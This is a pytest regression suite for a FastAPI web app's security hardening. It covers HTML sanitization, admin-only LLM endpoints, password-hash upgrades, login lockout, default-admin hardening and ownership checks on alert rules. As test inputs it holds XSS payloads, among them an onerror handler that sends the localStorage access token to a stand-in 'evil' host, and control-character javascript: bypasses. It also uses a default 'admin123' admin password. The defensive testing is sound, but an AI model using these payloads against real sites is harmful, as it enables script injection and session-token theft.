"""安全加固回归测试：XSS 净化、LLM 端点收敛、遗留哈希升级、登录锁定、alerts 属主校验。"""

from __future__ import annotations

import hashlib
import uuid

import pytest
from fastapi.testclient import TestClient


@pytest.fixture
def client(monkeypatch):
    monkeypatch.delenv("SUPABASE_DATABASE_URL", raising=False)
    from src.web_app import app

    return TestClient(app)


def _register(client: TestClient) -> tuple[str, str]:
    username = f"sec_{uuid.uuid4().hex[:8]}"
    password = "sec-test-pass"
    res = client.post(
        "/register",
        data={"username": username, "email": f"{username}@example.com", "password": password},
        headers={"X-Device-Id": f"device-{username}"},
    )
    assert res.status_code in (200, 302, 303), res.text
    return username, password


def _login(client: TestClient, username: str, password: str):
    return client.post(
        "/token",
        data={"username": username, "password": password},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )


def _admin_token(client: TestClient) -> str:
    # admin 由 init_database 种入（开发环境默认口令）
    res = _login(client, "admin", "admin123")
    assert res.status_code == 200, res.text
    return res.json()["access_token"]


# ---------------------------------------------------------------------------
# html_sanitizer 纯函数
# ---------------------------------------------------------------------------

def test_sanitizer_strips_script_content():
    from src.html_sanitizer import sanitize_rich_html

    out = sanitize_rich_html('<p>ok</p><script>alert(1)</script>')
    assert "<p>ok</p>" in out
    assert "alert" not in out


def test_sanitizer_strips_event_handlers():
    from src.html_sanitizer import sanitize_rich_html

    out = sanitize_rich_html('<img src="x" onerror="fetch(\'https://evil\')"><p>t</p>')
    assert "onerror" not in out
    assert "<p>t</p>" in out


def test_sanitizer_rejects_dangerous_urls():
    from src.html_sanitizer import sanitize_rich_html

    js = sanitize_rich_html('<a href="javascript:alert(1)">c</a>')
    assert "javascript" not in js.lower()
    data = sanitize_rich_html('<a href="data:text/html,<script>x</script>">c</a>')
    assert "data:text" not in data.lower()


def test_sanitizer_keeps_whitelisted_structure():
    from src.html_sanitizer import sanitize_rich_html

    raw = '<table class="t"><tr><td><strong>s</strong></td></tr></table><a href="https://a.b">l</a>'
    out = sanitize_rich_html(raw)
    assert out == raw


def test_sanitizer_plain_text_passthrough():
    from src.html_sanitizer import sanitize_rich_html

    assert sanitize_rich_html("") == ""
    assert sanitize_rich_html(None) == ""
    # 未知标签剥除，文本转义保留
    assert sanitize_rich_html("plain & <b>bold</b> tail") == "plain &amp; <b>bold</b> tail"


# ---------------------------------------------------------------------------
# 分享报告 XSS：落库净化 + 读取端已净化
# ---------------------------------------------------------------------------

def test_share_report_sanitizes_html(client):
    username, password = _register(client)
    token = _login(client, username, password).json()["access_token"]

    malicious = '<p>报告</p><script>alert(1)</script><img src=x onerror="fetch(\'https://evil/?t=\'+localStorage.getItem(\'access_token\'))">'
    share = client.post(
        "/api/report/share",
        params={"token": token},
        json={"report_type": "daily", "report_data": {"html": malicious}, "expires_hours": 1},
    )
    assert share.status_code == 200, share.text
    share_token = share.json()["share_token"]
    try:
        fetched = client.get(f"/api/report/shared/{share_token}")
        assert fetched.status_code == 200
        html = fetched.json()["report"]["report_data"]["html"]
        assert "onerror" not in html
        assert "script" not in html.lower()
        assert "<p>报告</p>" in html
    finally:
        from src.database import db_manager

        db_manager.execute("DELETE FROM shared_reports WHERE share_token = ?", (share_token,))


# ---------------------------------------------------------------------------
# LLM 端点 admin-only
# ---------------------------------------------------------------------------

def test_llm_config_forbidden_for_non_admin(client):
    username, password = _register(client)
    res = _login(client, username, password)
    token = res.json()["access_token"]

    assert client.get("/api/llm/config", params={"token": token}).status_code == 403
    assert client.post(
        "/api/llm/test",
        params={"token": token},
        json={"provider": "openai", "model": "gpt-4o-mini", "endpoint": "https://evil.example.com"},
    ).status_code == 403


def test_llm_config_allowed_for_admin(client):
    token = _admin_token(client)
    res = client.get("/api/llm/config", params={"token": token})
    assert res.status_code == 200
    assert res.json()["success"] is True


# ---------------------------------------------------------------------------
# 遗留 sha256 登录 + 懒升级
# ---------------------------------------------------------------------------

def test_legacy_sha256_login_and_lazy_upgrade(client):
    from src.auth import is_legacy_sha256_hex
    from src.database import UserRepository, db_manager

    username, password = _register(client)
    legacy_hash = hashlib.sha256(password.encode()).hexdigest()
    UserRepository.update(username, {"hashed_password": legacy_hash})

    res = _login(client, username, password)
    assert res.status_code == 200, res.text

    row = db_manager.execute_one("SELECT hashed_password FROM users WHERE username = ?", (username,))
    assert not is_legacy_sha256_hex(row["hashed_password"])
    assert row["hashed_password"].startswith("$pbkdf2")

    try:
        db_manager.execute("DELETE FROM users WHERE username = ?", (username,))
    except Exception:
        pass


# ---------------------------------------------------------------------------
# 登录失败锁定
# ---------------------------------------------------------------------------

def test_login_lockout_after_repeated_failures(client):
    from src.abuse_guard import record_login_success

    username, password = _register(client)
    for _ in range(10):
        bad = _login(client, username, "wrong-password")
        assert bad.status_code == 401

    locked = _login(client, username, password)
    assert locked.status_code == 429

    # 清理锁定状态，避免影响其他测试
    record_login_success(username)


def test_login_lock_helpers_unit():
    from src.abuse_guard import (
        check_login_locked,
        record_login_failure,
        record_login_success,
    )

    name = f"lock_{uuid.uuid4().hex[:8]}"
    try:
        assert not check_login_locked(name)
        for _ in range(9):
            record_login_failure(name)
        assert not check_login_locked(name)
        record_login_failure(name)
        assert check_login_locked(name)
        record_login_success(name)
        assert not check_login_locked(name)
    finally:
        record_login_success(name)


# ---------------------------------------------------------------------------
# harden_default_accounts（生产口径）与纯函数
# ---------------------------------------------------------------------------

def test_admin_password_is_default_variants():
    from src.database import _hash_password, admin_password_is_default

    assert admin_password_is_default(_hash_password("admin123"))
    assert not admin_password_is_default(_hash_password("other"))
    assert not admin_password_is_default(None)
    assert not admin_password_is_default("")


def test_harden_default_accounts_resets_in_production(monkeypatch):
    from src.auth import verify_password
    from src.database import _hash_password, db_manager

    row = db_manager.execute_one("SELECT hashed_password FROM users WHERE username = 'admin'")
    original_hash = row["hashed_password"]
    try:
        # 构造仍在使用默认口令的 admin（sha256 形式）
        db_manager.execute(
            "UPDATE users SET hashed_password = ? WHERE username = 'admin'",
            (_hash_password("admin123"),),
        )
        monkeypatch.setenv("APP_ENV", "production")
        monkeypatch.setenv("INITIAL_ADMIN_PASSWORD", "hardened-test-pass")

        from src.database import harden_default_accounts

        harden_default_accounts()

        new_hash = db_manager.execute_one(
            "SELECT hashed_password FROM users WHERE username = 'admin'"
        )["hashed_password"]
        assert new_hash != _hash_password("admin123")
        assert verify_password("hardened-test-pass", new_hash)
        assert not verify_password("admin123", new_hash)
    finally:
        db_manager.execute(
            "UPDATE users SET hashed_password = ? WHERE username = 'admin'",
            (original_hash,),
        )


def test_harden_resyncs_admin_password_from_env(monkeypatch):
    """首启随机口令后，设置 INITIAL_ADMIN_PASSWORD 重启即可恢复（幂等同步）。"""
    from src.auth import verify_password
    from src.database import _hash_password_strong, db_manager, harden_default_accounts

    row = db_manager.execute_one("SELECT hashed_password FROM users WHERE username = 'admin'")
    original_hash = row["hashed_password"]
    try:
        db_manager.execute(
            "UPDATE users SET hashed_password = ? WHERE username = 'admin'",
            (_hash_password_strong("lost-random-password"),),
        )
        monkeypatch.setenv("APP_ENV", "production")
        monkeypatch.setenv("INITIAL_ADMIN_PASSWORD", "recovered-pass-1")
        harden_default_accounts()
        new_hash = db_manager.execute_one(
            "SELECT hashed_password FROM users WHERE username = 'admin'"
        )["hashed_password"]
        assert verify_password("recovered-pass-1", new_hash)

        # 幂等：口令已匹配时不重写
        harden_default_accounts()
        again = db_manager.execute_one(
            "SELECT hashed_password FROM users WHERE username = 'admin'"
        )["hashed_password"]
        assert again == new_hash
    finally:
        db_manager.execute(
            "UPDATE users SET hashed_password = ? WHERE username = 'admin'",
            (original_hash,),
        )


def test_harden_noop_outside_production(monkeypatch):
    import hashlib

    from src.database import db_manager, harden_default_accounts

    row = db_manager.execute_one("SELECT hashed_password FROM users WHERE username = 'admin'")
    original_hash = row["hashed_password"]
    default_hash = hashlib.sha256(b"admin123").hexdigest()
    try:
        db_manager.execute(
            "UPDATE users SET hashed_password = ? WHERE username = 'admin'",
            (default_hash,),
        )
        monkeypatch.setenv("APP_ENV", "development")
        monkeypatch.delenv("INITIAL_ADMIN_PASSWORD", raising=False)
        harden_default_accounts()
        after = db_manager.execute_one(
            "SELECT hashed_password FROM users WHERE username = 'admin'"
        )["hashed_password"]
        assert after == default_hash
    finally:
        db_manager.execute(
            "UPDATE users SET hashed_password = ? WHERE username = 'admin'",
            (original_hash,),
        )


# ---------------------------------------------------------------------------
# alerts CRUD + IDOR 属主校验
# ---------------------------------------------------------------------------

def test_alerts_crud_and_idor(client):
    from src.database import db_manager

    user_a, pw_a = _register(client)
    token_a = _login(client, user_a, pw_a).json()["access_token"]
    user_b, pw_b = _register(client)
    token_b = _login(client, user_b, pw_b).json()["access_token"]

    created = client.post(
        "/api/alerts",
        params={"token": token_a},
        json={"name": "sec-rule", "metric": "positive_rate", "operator": "lt", "threshold": 0.5},
    )
    assert created.status_code == 200, created.text
    assert created.json()["success"] is True

    row = db_manager.execute_one(
        "SELECT id FROM alert_rules WHERE username = ? ORDER BY id DESC", (user_a,)
    )
    assert row, "alert_rules 应含新规则（username 列存在）"
    alert_id = row["id"]
    try:
        # GET 只返回本人规则
        mine = client.get("/api/alerts", params={"token": token_a}).json()["alerts"]
        assert any(a["id"] == alert_id for a in mine)
        theirs = client.get("/api/alerts", params={"token": token_b}).json()["alerts"]
        assert not any(a["id"] == alert_id for a in theirs)

        # 用户 B 改/删用户 A 的规则 → 404
        assert client.put(
            f"/api/alerts/{alert_id}", params={"token": token_b}, json={"name": "hijack"}
        ).status_code == 404
        assert client.delete(f"/api/alerts/{alert_id}", params={"token": token_b}).status_code == 404

        # 属主更新成功
        ok = client.put(
            f"/api/alerts/{alert_id}", params={"token": token_a}, json={"name": "renamed"}
        )
        assert ok.status_code == 200 and ok.json()["success"] is True
        after = db_manager.execute_one("SELECT name FROM alert_rules WHERE id = ?", (alert_id,))
        assert after["name"] == "renamed"

        # 属主删除成功
        assert client.delete(f"/api/alerts/{alert_id}", params={"token": token_a}).status_code == 200
        assert not db_manager.execute_one("SELECT id FROM alert_rules WHERE id = ?", (alert_id,))
    finally:
        db_manager.execute("DELETE FROM alert_rules WHERE id = ?", (alert_id,))


# ---------------------------------------------------------------------------
# 审查修复回归：URL 控制符绕过、report_type 白名单
# ---------------------------------------------------------------------------

def test_sanitizer_strips_control_chars_before_url_check():
    from src.html_sanitizer import sanitize_rich_html

    # \x0e 前缀会被浏览器 URL 解析剥除并还原出 javascript: scheme
    out = sanitize_rich_html('<a href="\x0ejavascript:alert(1)">c</a>')
    assert "javascript" not in out.lower()
    for prefix in ("\x01", "\x07", "\x0e", "\x1b"):
        assert "javascript" not in sanitize_rich_html(
            f'<a href="{prefix}javascript:alert(1)">c</a>'
        ).lower()


def test_sanitizer_adds_rel_to_blank_target():
    from src.html_sanitizer import sanitize_rich_html

    out = sanitize_rich_html('<a href="https://a.b" target="_blank">c</a>')
    assert 'rel="noopener noreferrer"' in out
    # 已有 rel 被强制覆盖
    out2 = sanitize_rich_html('<a href="https://a.b" target="_blank" rel="opener">c</a>')
    assert 'rel="noopener noreferrer"' in out2
    assert "opener" not in out2.replace('rel="noopener noreferrer"', "")


def test_share_report_whitelists_report_type(client):
    username, password = _register(client)
    token = _login(client, username, password).json()["access_token"]

    res = client.post(
        "/api/report/share",
        params={"token": token},
        json={"report_type": 'daily<img src=x onerror=alert(1)>', "report_data": {}, "expires_hours": 1},
    )
    assert res.status_code == 200
    share_token = res.json()["share_token"]
    try:
        fetched = client.get(f"/api/report/shared/{share_token}")
        assert fetched.json()["report"]["report_type"] == "custom"
    finally:
        from src.database import db_manager

        db_manager.execute("DELETE FROM shared_reports WHERE share_token = ?", (share_token,))
